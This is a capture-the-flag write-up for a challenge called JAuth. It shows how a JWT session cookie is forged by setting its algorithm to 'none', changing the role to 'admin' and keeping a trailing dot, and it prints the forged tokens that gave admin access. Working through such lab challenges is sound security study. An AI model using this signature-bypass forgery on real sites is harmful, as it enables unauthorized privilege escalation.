# JAuth

> Can you identify the components and exploit the vulnerable one? The website is running here. Can you become an admin? You can login as `test` with the password `Test123!` to get started.

When I logged in using the test account, the following `token` cookie appeared:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjg0NzI5NjAxNDQ0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi40IFNhZmFyaS82MDUuMS4xNSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg0NzI5NjAxfQ.ZK8YZiblfVhk-SdLl-qjvjOP6wXHZ3mgKc7e4RhVXsw
```

Three base64 strings split by `.`-characters in between: probably a JWT token. I always use the [`jwt.io`](https://jwt.io) debugger to inspect those:

![](https://i.imgur.com/tTO5aeN.png)

Looks like we will have to change the `role` field to `"admin"`... but how will be we able to generate the right signature? I always try editing the cookie and leaving the signature empty... maybe the implementation just doesn't check the signature :) That didn't work here though, so let's try something different.

Sometimes setting the `alg` field to `none` (and then leaving the signature out) works. So I tried this cookie (which a JWT debugger generated):

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg0NzI5NjAxNDQ0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi40IFNhZmFyaS82MDUuMS4xNSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDcyOTYwMX0
```

Hmm, doesn't work again. Let's try to still add the `.` at the end, maybe something is checking if the three dots are there.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg0NzI5NjAxNDQ0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi40IFNhZmFyaS82MDUuMS4xNSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NDcyOTYwMX0.
```

Which worked! The website showed the flag after reloading with this cookie.



